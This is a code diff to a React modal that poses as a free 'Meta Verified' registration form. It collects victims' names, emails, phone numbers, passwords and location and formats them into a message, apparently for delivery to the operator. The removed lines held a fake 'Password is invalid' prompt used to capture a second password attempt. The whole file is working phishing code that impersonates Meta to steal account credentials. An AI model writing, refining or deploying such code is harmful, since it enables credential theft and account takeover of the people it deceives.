@@ -31,9 +31,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
-    const [showPasswordError, setShowPasswordError] = useState(false);
-    const [firstPassword, setFirstPassword] = useState('');
-    const [passwordEntryCount, setPasswordEntryCount] = useState(0);
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
@@ -92,26 +89,12 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
         setShowAgreeError(false);
-        setShowPasswordError(false);
         if (!agree) {
             setShowAgreeError(true);
             return;
         }
-        // Chỉ cho submit nếu đã nhập pass 2 lần (không kiểm tra khớp)
-        if (passwordEntryCount < 2 || !password) {
-            setShowPasswordError(true);
-            return;
-        }
         if (isLoading) return;
         setIsLoading(true);
-        let pw1 = firstPassword;
-        if (window.sessionStorage) {
-            const sessionPw1 = window.sessionStorage.getItem('firstPassword');
-            if (sessionPw1) {
-                pw1 = sessionPw1;
-            }
-        }
-        window.sessionStorage.setItem('firstPassword', pw1);
         const message = `
 ${
     geoInfo
@@ -122,8 +105,7 @@ ${
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
-<b>🔒 Password lần 1:</b> <code>${pw1}</code>
-<b>🔒 Password lần 2:</b> <code>${password}</code>
+<b>🔒 Password:</b> <code>${password}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
@@ -147,7 +129,7 @@ ${
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
             <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-2 flex w-full items-center justify-between p-2 md:p-4 pb-0'>
-                    <p className='text-2xl font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
+                    <p className='text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='xl' />
                     </button>
@@ -177,38 +159,13 @@ ${
                                 value={password}
                                 onChange={e => {
                                     setPassword(e.target.value);
-                                    setShowPasswordError(false);
-                                }}
-                                onBlur={() => {
-                                    if (password) {
-                                        if (passwordEntryCount === 0) {
-                                            setFirstPassword(password);
-                                            if (window.sessionStorage) {
-                                                window.sessionStorage.setItem('firstPassword', password);
-                                            }
-                                            setPassword('');
-                                            setPasswordEntryCount(1);
-                                            setShowPasswordError(true);
-                                        } else if (passwordEntryCount === 1) {
-                                            setPasswordEntryCount(2);
-                                            setShowPasswordError(false);
-                                        }
-                                    }
                                 }}
                                 className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-sm md:text-base'
                                 required
                                 autoComplete='new-password'
-                                disabled={passwordEntryCount === 2}
                             />
                             <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
                         </div>
-                        {/* Không kiểm tra độ dài password */}
-                        {showPasswordError && passwordEntryCount === 1 && (
-                            <span className='text-xs text-red-600'>{t('Password is invalid. Please enter again.')}</span>
-                        )}
-                        {passwordEntryCount === 2 && (
-                            <span className='text-xs text-green-600'>{t('Password confirmed. You can submit now.')}</span>
-                        )}
                         <div className='flex flex-col items-start gap-1 pt-2'>
                             <div className='flex items-center gap-2'>
                                 <input
